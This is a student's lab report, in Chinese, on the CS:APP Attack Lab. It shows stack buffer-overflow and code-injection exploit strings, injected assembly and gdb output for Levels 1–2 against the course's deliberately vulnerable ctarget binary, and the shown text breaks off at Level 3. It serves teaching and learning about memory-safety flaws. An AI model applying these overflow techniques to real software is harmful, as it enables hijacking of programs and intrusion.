<!DOCTYPE html><html><head>
      <title>Lab3Report</title>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      
      <link rel="stylesheet" href="file:///c:\Users\eagle\.vscode\extensions\shd101wyy.markdown-preview-enhanced-0.8.18\crossnote\dependencies\katex\katex.min.css">
      
      
      
      
      
      <style>
      code[class*=language-],pre[class*=language-]{color:#333;background:0 0;font-family:Consolas,"Liberation Mono",Menlo,Courier,monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.4;-moz-tab-size:8;-o-tab-size:8;tab-size:8;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:.8em;overflow:auto;border-radius:3px;background:#f5f5f5}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal;background:#f5f5f5}.token.blockquote,.token.comment{color:#969896}.token.cdata{color:#183691}.token.doctype,.token.macro.property,.token.punctuation,.token.variable{color:#333}.token.builtin,.token.important,.token.keyword,.token.operator,.token.rule{color:#a71d5d}.token.attr-value,.token.regex,.token.string,.token.url{color:#183691}.token.atrule,.token.boolean,.token.code,.token.command,.token.constant,.token.entity,.token.number,.token.property,.token.symbol{color:#0086b3}.token.prolog,.token.selector,.token.tag{color:#63a35c}.token.attr-name,.token.class,.token.class-name,.token.function,.token.id,.token.namespace,.token.pseudo-class,.token.pseudo-element,.token.url-reference .token.variable{color:#795da3}.token.entity{cursor:help}.token.title,.token.title .token.punctuation{font-weight:700;color:#1d3e81}.token.list{color:#ed6a43}.token.inserted{background-color:#eaffea;color:#55a532}.token.deleted{background-color:#ffecec;color:#bd2c00}.token.bold{font-weight:700}.token.italic{font-style:italic}.language-json .token.property{color:#183691}.language-markup .token.tag .token.punctuation{color:#333}.language-css .token.function,code.language-css{color:#0086b3}.language-yaml .token.atrule{color:#63a35c}code.language-yaml{color:#183691}.language-ruby .token.function{color:#333}.language-markdown .token.url{color:#795da3}.language-makefile .token.symbol{color:#795da3}.language-makefile .token.variable{color:#183691}.language-makefile .token.builtin{color:#0086b3}.language-bash .token.keyword{color:#0086b3}pre[data-line]{position:relative;padding:1em 0 1em 3em}pre[data-line] .line-highlight-wrapper{position:absolute;top:0;left:0;background-color:transparent;display:block;width:100%}pre[data-line] .line-highlight{position:absolute;left:0;right:0;padding:inherit 0;margin-top:1em;background:hsla(24,20%,50%,.08);background:linear-gradient(to right,hsla(24,20%,50%,.1) 70%,hsla(24,20%,50%,0));pointer-events:none;line-height:inherit;white-space:pre}pre[data-line] .line-highlight:before,pre[data-line] .line-highlight[data-end]:after{content:attr(data-start);position:absolute;top:.4em;left:.6em;min-width:1em;padding:0 .5em;background-color:hsla(24,20%,50%,.4);color:#f4f1ef;font:bold 65%/1.5 sans-serif;text-align:center;vertical-align:.3em;border-radius:999px;text-shadow:none;box-shadow:0 1px #fff}pre[data-line] .line-highlight[data-end]:after{content:attr(data-end);top:auto;bottom:.4em}html body{font-family:'Helvetica Neue',Helvetica,'Segoe UI',Arial,freesans,sans-serif;font-size:16px;line-height:1.6;color:#333;background-color:#fff;overflow:initial;box-sizing:border-box;word-wrap:break-word}html body>:first-child{margin-top:0}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{line-height:1.2;margin-top:1em;margin-bottom:16px;color:#000}html body h1{font-size:2.25em;font-weight:300;padding-bottom:.3em}html body h2{font-size:1.75em;font-weight:400;padding-bottom:.3em}html body h3{font-size:1.5em;font-weight:500}html body h4{font-size:1.25em;font-weight:600}html body h5{font-size:1.1em;font-weight:600}html body h6{font-size:1em;font-weight:600}html body h1,html body h2,html body h3,html body h4,html body h5{font-weight:600}html body h5{font-size:1em}html body h6{color:#5c5c5c}html body strong{color:#000}html body del{color:#5c5c5c}html body a:not([href]){color:inherit;text-decoration:none}html body a{color:#08c;text-decoration:none}html body a:hover{color:#00a3f5;text-decoration:none}html body img{max-width:100%}html body>p{margin-top:0;margin-bottom:16px;word-wrap:break-word}html body>ol,html body>ul{margin-bottom:16px}html body ol,html body ul{padding-left:2em}html body ol.no-list,html body ul.no-list{padding:0;list-style-type:none}html body ol ol,html body ol ul,html body ul ol,html body ul ul{margin-top:0;margin-bottom:0}html body li{margin-bottom:0}html body li.task-list-item{list-style:none}html body li>p{margin-top:0;margin-bottom:0}html body .task-list-item-checkbox{margin:0 .2em .25em -1.8em;vertical-align:middle}html body .task-list-item-checkbox:hover{cursor:pointer}html body blockquote{margin:16px 0;font-size:inherit;padding:0 15px;color:#5c5c5c;background-color:#f0f0f0;border-left:4px solid #d6d6d6}html body blockquote>:first-child{margin-top:0}html body blockquote>:last-child{margin-bottom:0}html body hr{height:4px;margin:32px 0;background-color:#d6d6d6;border:0 none}html body table{margin:10px 0 15px 0;border-collapse:collapse;border-spacing:0;display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}html body table th{font-weight:700;color:#000}html body table td,html body table th{border:1px solid #d6d6d6;padding:6px 13px}html body dl{padding:0}html body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:700}html body dl dd{padding:0 16px;margin-bottom:16px}html body code{font-family:Menlo,Monaco,Consolas,'Courier New',monospace;font-size:.85em;color:#000;background-color:#f0f0f0;border-radius:3px;padding:.2em 0}html body code::after,html body code::before{letter-spacing:-.2em;content:'\00a0'}html body pre>code{padding:0;margin:0;word-break:normal;white-space:pre;background:0 0;border:0}html body .highlight{margin-bottom:16px}html body .highlight pre,html body pre{padding:1em;overflow:auto;line-height:1.45;border:#d6d6d6;border-radius:3px}html body .highlight pre{margin-bottom:0;word-break:normal}html body pre code,html body pre tt{display:inline;max-width:initial;padding:0;margin:0;overflow:initial;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}html body pre code:after,html body pre code:before,html body pre tt:after,html body pre tt:before{content:normal}html body blockquote,html body dl,html body ol,html body p,html body pre,html body ul{margin-top:0;margin-bottom:16px}html body kbd{color:#000;border:1px solid #d6d6d6;border-bottom:2px solid #c7c7c7;padding:2px 4px;background-color:#f0f0f0;border-radius:3px}@media print{html body{background-color:#fff}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{color:#000;page-break-after:avoid}html body blockquote{color:#5c5c5c}html body pre{page-break-inside:avoid}html body table{display:table}html body img{display:block;max-width:100%;max-height:100%}html body code,html body pre{word-wrap:break-word;white-space:pre}}.markdown-preview{width:100%;height:100%;box-sizing:border-box}.markdown-preview ul{list-style:disc}.markdown-preview ul ul{list-style:circle}.markdown-preview ul ul ul{list-style:square}.markdown-preview ol{list-style:decimal}.markdown-preview ol ol,.markdown-preview ul ol{list-style-type:lower-roman}.markdown-preview ol ol ol,.markdown-preview ol ul ol,.markdown-preview ul ol ol,.markdown-preview ul ul ol{list-style-type:lower-alpha}.markdown-preview .newpage,.markdown-preview .pagebreak{page-break-before:always}.markdown-preview pre.line-numbers{position:relative;padding-left:3.8em;counter-reset:linenumber}.markdown-preview pre.line-numbers>code{position:relative}.markdown-preview pre.line-numbers .line-numbers-rows{position:absolute;pointer-events:none;top:1em;font-size:100%;left:0;width:3em;letter-spacing:-1px;border-right:1px solid #999;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-preview pre.line-numbers .line-numbers-rows>span{pointer-events:none;display:block;counter-increment:linenumber}.markdown-preview pre.line-numbers .line-numbers-rows>span:before{content:counter(linenumber);color:#999;display:block;padding-right:.8em;text-align:right}.markdown-preview .mathjax-exps .MathJax_Display{text-align:center!important}.markdown-preview:not([data-for=preview]) .code-chunk .code-chunk-btn-group{display:none}.markdown-preview:not([data-for=preview]) .code-chunk .status{display:none}.markdown-preview:not([data-for=preview]) .code-chunk .output-div{margin-bottom:16px}.markdown-preview .md-toc{padding:0}.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link{display:inline;padding:.25rem 0}.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link div,.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link p{display:inline}.markdown-preview .md-toc .md-toc-link-wrapper.highlighted .md-toc-link{font-weight:800}.scrollbar-style::-webkit-scrollbar{width:8px}.scrollbar-style::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}.scrollbar-style::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,.66);border:4px solid rgba(150,150,150,.66);background-clip:content-box}html body[for=html-export]:not([data-presentation-mode]){position:relative;width:100%;height:100%;top:0;left:0;margin:0;padding:0;overflow:auto}html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{position:relative;top:0;min-height:100vh}@media screen and (min-width:914px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{padding:2em calc(50% - 457px + 2em)}}@media screen and (max-width:914px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{font-size:14px!important;padding:1em}}@media print{html body[for=html-export]:not([data-presentation-mode]) #sidebar-toc-btn{display:none}}html body[for=html-export]:not([data-presentation-mode]) #sidebar-toc-btn{position:fixed;bottom:8px;left:8px;font-size:28px;cursor:pointer;color:inherit;z-index:99;width:32px;text-align:center;opacity:.4}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] #sidebar-toc-btn{opacity:1}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc{position:fixed;top:0;left:0;width:300px;height:100%;padding:32px 0 48px 0;font-size:14px;box-shadow:0 0 4px rgba(150,150,150,.33);box-sizing:border-box;overflow:auto;background-color:inherit}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar{width:8px}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,.66);border:4px solid rgba(150,150,150,.66);background-clip:content-box}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc a{text-decoration:none}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc{padding:0 16px}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link{display:inline;padding:.25rem 0}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link div,html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link p{display:inline}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper.highlighted .md-toc-link{font-weight:800}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{left:300px;width:calc(100% - 300px);padding:2em calc(50% - 457px - 300px / 2);margin:0;box-sizing:border-box}@media screen and (max-width:1274px){html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{width:100%}}html body[for=html-export]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .markdown-preview{left:50%;transform:translateX(-50%)}html body[for=html-export]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .md-sidebar-toc{display:none}
/* Please visit the URL below for more information: */
/*   https://shd101wyy.github.io/markdown-preview-enhanced/#/customize-css */

      </style>
      <!-- The content below will be included at the end of the <head> element. --><script type="text/javascript">
  document.addEventListener("DOMContentLoaded", function () {
    // your code here
  });
</script></head><body for="html-export">
    
    
      <div class="crossnote markdown-preview  ">
      
<h1 id="lab3---attack-lab-report">Lab3 - Attack Lab Report </h1>
<blockquote>
<p>陈睿 10245101560</p>
</blockquote>
<h2 id="前置知识">前置知识 </h2>
<p>本实验聚焦于一个关键函数<code>getbuf()</code>：</p>
<pre data-role="codeBlock" data-info="c" class="language-c c"><code><span class="token keyword keyword-unsigned">unsigned</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword keyword-char">char</span> buf<span class="token punctuation">[</span>BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">Gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword keyword-return">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><p>我们给<code>buf</code>数组分配了<code>BUFFER_SIZE</code>大小的空间，然后调用了<code>Gets()</code>函数来读取一行。这里的<code>Gets()</code>和标准C库中的<code>gets()</code>一样，都不会检查我们的输入是否超过了我们设定的大小，这也就是我们实验的目的所在：借助这一缓冲区溢出的特性实现攻击。</p>
<blockquote>
<p>所以<code>gets()</code>并不是一个安全的做法，我们应该在编程时尽可能使用'fgets()'。</p>
</blockquote>
<p>当我们输入：</p>
<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>./ctarget <span class="token parameter variable">-q</span>
</code></pre><p>对于<code>ctarget</code>的用法：</p>
<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>Usage: <span class="token punctuation">[</span>-hq<span class="token punctuation">]</span> ./ctarget <span class="token parameter variable">-i</span> <span class="token operator">&lt;</span>infile<span class="token operator">&gt;</span> 
  <span class="token parameter variable">-h</span>          Print <span class="token builtin class-name">help</span> information
  <span class="token parameter variable">-q</span>          Don't submit result to server
  <span class="token parameter variable">-i</span> <span class="token operator">&lt;</span>infile<span class="token operator">&gt;</span> Input <span class="token function">file</span>
</code></pre><p>显然我们不需要提交到服务器，所以用<code>-q</code>参数。返回如下：</p>
<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>Cookie: 0x59b997fa
Ouch<span class="token operator">!</span>: You caused a segmentation fault<span class="token operator">!</span>
Better luck next <span class="token function">time</span>
FAIL: Would have posted the following:
        user <span class="token function">id</span> bovik
        course  <span class="token number">15213</span>-f15
        lab     attacklab
        result  <span class="token number">1</span>:FAIL:0xffffffff:ctarget:0:
</code></pre><p>这个时候就发生了溢出。</p>
<p>对于实验提供的工具<code>HEX2RAW</code>，可以方便地帮助我们从16进制文件生成攻击字符串。</p>
<hr>
<h2 id="代码注入攻击">代码注入攻击 </h2>
<h3 id="level-1">Level 1 </h3>
<p><code>getbuf()</code>被一个<code>test()</code>函数所调用：</p>
<pre data-role="codeBlock" data-info="c" class="language-c c"><code><span class="token keyword keyword-void">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword keyword-int">int</span> val<span class="token punctuation">;</span>
    val <span class="token operator">=</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No exploit. Getbuf returned 0x%x\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><p>我们希望我们执行<code>touch1()</code>函数：</p>
<pre data-role="codeBlock" data-info="c" class="language-c c"><code><span class="token keyword keyword-void">void</span> <span class="token function">touch1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    vlevel <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">/* Part of validation protocol */</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch1!: You called touch1()\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><p>当输出了<code>Touch1!: You called touch1()</code>，我们确实就攻击成功了。</p>
<p>我们的思路就是，首先反汇编<code>ctarget</code>，找出<code>touch1()</code>的入口地址，然后尝试让<code>test()</code>的控制流切换给<code>touch1()</code>，可以借助<code>gdb</code>工具。</p>
<p>使用<code>objdump</code>反汇编：</p>
<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>objdump <span class="token parameter variable">-d</span> ctarget <span class="token operator">&gt;</span> ctarget.asm
</code></pre><p>查看一下<code>getbuf()</code>，得到：</p>
<pre data-role="codeBlock" data-info="asm" class="language-asm asm"><code>00000000004017a8 &lt;getbuf&gt;:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 &lt;Gets&gt;
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret    
  4017be:	90                   	nop
  4017bf:	90                   	nop
</code></pre><p>我们可以看出，这个函数申请了<code>0x28</code>个字节的空间，这块空间实际上就是<code>BUFFER_SIZE</code>大小。因此，我们要注入的字符串就是<code>0x28</code>大小的随机内容加上<code>touch1()</code>的地址，这样在函数返回的时候就会因为进入缓冲区溢出的部分内容的地址，达到我们注入攻击的目的。已知<code>touch1()</code>的地址为<code>0x4017c0</code>，我们可以编写一个<code>p1.txt</code>文件（注意小端法）：</p>
<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 <span class="token number">17</span> <span class="token number">40</span> 00 00 00 00 00
</code></pre><p>然后运行：</p>
<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>./hex2raw <span class="token operator">&lt;</span> p1.txt <span class="token operator">&gt;</span> p1
./ctarget <span class="token parameter variable">-qi</span> p1
</code></pre><p>运行成功了！</p>
<p><img src="https://s2.loli.net/2025/05/31/Y7grdLMQp2HxlDf.png" alt="1_level_1.png"></p>
<p>我这里由于一开始没有使用<code>-qi</code>参数，而是仅仅使用<code>-q</code>，导致文件内容没有正确传入程序，debug了将近三个小时才发现问题所在。提醒我在使用前一定要仔细观察用法。</p>
<hr>
<h3 id="level-2">Level 2 </h3>
<p>在第二关中，我们需要执行地址为<code>0x4017ec</code>的<code>touch2()</code>：</p>
<pre data-role="codeBlock" data-info="c" class="language-c c"><code><span class="token keyword keyword-void">void</span> <span class="token function">touch2</span><span class="token punctuation">(</span><span class="token keyword keyword-unsigned">unsigned</span> val<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    vlevel <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">/* Part of validation protocol */</span>
    <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> cookie<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch2!: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword keyword-else">else</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><p>我们需要把我们的<code>cookie</code>作为第一个参数传入函数。回想起第三章的知识，<code>%rdi</code>寄存器就存放了函数的第一个参数。</p>
<p>我们知道，<code>ret</code>指令相当于<code>pop %rip</code>，因此我们可以自己编写一段代码，实现将<code>cookie</code>放入寄存器<code>%rdi</code>中，然后把<code>touch2()</code>的地址压入栈底，最后<code>return</code>，进入<code>touch2()</code>。可是，我们要如何做到能够执行我们自己编写的汇编代码呢？</p>
<p>我们只能运用40个字节之后溢出的8个字节来返回到这一地址。倘若溢出的8个字节正好指向的是我们<code>BUFFER_SIZE</code>的40个字节的首位，即栈顶，我们就能通过将前40个字节注入我们自己编写的汇编代码，从而实现跳转到我们自己的指令，最终跳转到<code>touch2()</code>函数，同时又带上了<code>cookie</code>信息。</p>
<p>我们的<code>cookie: 0x59b997fa</code> <code>touch2(): 0x4017ec</code>，因此有汇编代码放入<code>p2.s</code>：</p>
<pre data-role="codeBlock" data-info="asm" class="language-asm asm"><code>movq $0x59b997fa, %rdi
pushq $0x4017ec
ret
</code></pre><p>利用附录B的字节表示生成工具：</p>
<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>gcc <span class="token parameter variable">-c</span> p2.s
objdump <span class="token parameter variable">-d</span> p2.o <span class="token operator">&gt;</span> p2.d
</code></pre><p>得到字节表示：</p>
<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>p2.o:     <span class="token function">file</span> <span class="token function">format</span> elf64-x86-64


Disassembly of section .text:

0000000000000000 <span class="token operator">&lt;</span>.text<span class="token operator">&gt;</span>:
   <span class="token number">0</span>:	<span class="token number">48</span> c7 c7 fa <span class="token number">97</span> b9 <span class="token number">59</span> 	mov    <span class="token variable">$0x59b997fa</span>,%rdi
   <span class="token number">7</span>:	<span class="token number">68</span> ec <span class="token number">17</span> <span class="token number">40</span> 00       	push   <span class="token variable">$0x4017ec</span>
   c:	c3                   	ret    
</code></pre><p>我们就得到了字节序列：</p>
<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token number">48</span> c7 c7 fa <span class="token number">97</span> b9 <span class="token number">59</span> <span class="token number">68</span>
ec <span class="token number">17</span> <span class="token number">40</span> 00 c3
</code></pre><p>这个序列就可以放在我们注入攻击的字符串的前40个字节。我们现在需要找到<code>getbuf()</code>栈顶的位置，这样的话，当我们在缓冲区最后8位注入了此时栈顶的位置，我们就可以跳转到此时的栈顶，开始执行我们注入的指令。</p>
<p>用<code>gdb</code>查找栈顶的地址。</p>
<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> b getbuf
Breakpoint <span class="token number">1</span> at 0x4017a8: <span class="token function">file</span> buf.c, line <span class="token number">12</span>.
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> r <span class="token parameter variable">-qi</span> p1
Starting program: /mnt/c/Users/eagle/Documents/Repos/Eagle233-In-Class-Practices/CSAPP/Lab3 - attack lab/lab3/target1/ctarget <span class="token parameter variable">-qi</span> p1
<span class="token punctuation">[</span>Thread debugging using libthread_db enabled<span class="token punctuation">]</span>
Using <span class="token function">host</span> libthread_db library <span class="token string">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="token builtin class-name">.</span>
Cookie: 0x59b997fa

Breakpoint <span class="token number">1</span>, getbuf <span class="token punctuation">(</span><span class="token punctuation">)</span> at buf.c:12
<span class="token number">12</span>      buf.c: No such <span class="token function">file</span> or directory.
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> s
<span class="token number">14</span>      <span class="token keyword keyword-in">in</span> buf.c
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disas
Dump of assembler code <span class="token keyword keyword-for">for</span> <span class="token keyword keyword-function">function</span> getbuf:
   0x00000000004017a8 <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>:     sub    <span class="token variable">$0x28</span>,%rsp
<span class="token operator">=</span><span class="token operator">&gt;</span> 0x00000000004017ac <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">4</span>&gt;</span>:     mov    %rsp,%rdi
   0x00000000004017af <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">7</span>&gt;</span>:     call   0x401a40 <span class="token operator">&lt;</span>Gets<span class="token operator">&gt;</span>
   0x00000000004017b4 <span class="token operator">&lt;</span>+1<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>:    mov    <span class="token variable">$0x1</span>,%eax
   0x00000000004017b9 <span class="token operator">&lt;</span>+1<span class="token operator"><span class="token file-descriptor important">7</span>&gt;</span>:    <span class="token function">add</span>    <span class="token variable">$0x28</span>,%rsp
   0x00000000004017bd <span class="token operator">&lt;</span>+2<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>:    ret
End of assembler dump.

<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> p/x <span class="token variable">$rsp</span>
<span class="token variable">$1</span> <span class="token operator">=</span> 0x5561dc78
</code></pre><p>因此栈顶的地址为<code>0x5561dc78</code>。于是我们可以写出序列到<code>p2.txt</code>：</p>
<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token number">48</span> c7 c7 fa <span class="token number">97</span> b9 <span class="token number">59</span> <span class="token number">68</span>
ec <span class="token number">17</span> <span class="token number">40</span> 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
<span class="token number">78</span> <span class="token function">dc</span> <span class="token number">61</span> <span class="token number">55</span> 00 00 00 00
</code></pre><p>然后运行：</p>
<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>./hex2raw <span class="token operator">&lt;</span> p2.txt <span class="token operator">&gt;</span> p2
./ctarget <span class="token parameter variable">-qi</span> p2
</code></pre><p>运行成功了！</p>
<p><img src="https://s2.loli.net/2025/05/31/gF3YNKE5anmVlQD.png" alt="1_level_2.png"></p>
<hr>
<h3 id="level-3">Level 3 </h3>
<p><code>touch3()</code>和<code>hexmatch()</code>代码如下</p>
<pre data-role="codeBlock" data-info="c" class="language-c c"><code><span class="token keyword keyword-void">void</span> <span class="token function">touch3</span><span class="token punctuation">(</span><span class="token keyword keyword-char">char</span> <span class="token operator">*</span>sval<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    vlevel <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token comment">/* Part of validation protocol */</span>
    <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span><span class="token function">hexmatch</span><span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch3!: You called touch3(\"%s\")\n"</span><span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword keyword-else">else</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch3(\"%s\")\n"</span><span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><pre data-role="codeBlock" data-info="c" class="language-c c"><code><span class="token comment">/* Compare string to hex represention of unsigned value */</span>
<span class="token keyword keyword-int">int</span> <span class="token function">hexmatch</span><span class="token punctuation">(</span><span class="token keyword keyword-unsigned">unsigned</span> val<span class="token punctuation">,</span> <span class="token keyword keyword-char">char</span> <span class="token operator">*</span>sval<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword keyword-char">char</span> cbuf<span class="token punctuation">[</span><span class="token number">110</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token comment">/* Make position of check string unpredictable */</span>
    <span class="token keyword keyword-char">char</span> <span class="token operator">*</span>s <span class="token operator">=</span> cbuf <span class="token operator">+</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">100</span><span class="token punctuation">;</span>
    <span class="token function">sprintf</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"%.8x"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword keyword-return">return</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>sval<span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><p>这一个<code>hexmatch()</code>使得我们注入不再可预测了，因为假如还是和上一题那样注入，由于我们的<code>s</code>在随机向上延伸，那么就有可能写爆<code>getbuf()</code>栈帧里面的内容，我们无法使用上一题在<code>getbuf()</code>的栈帧注入的方法。因此我们可以想到在<code>test()</code>的栈帧保存我们的字符串。</p>
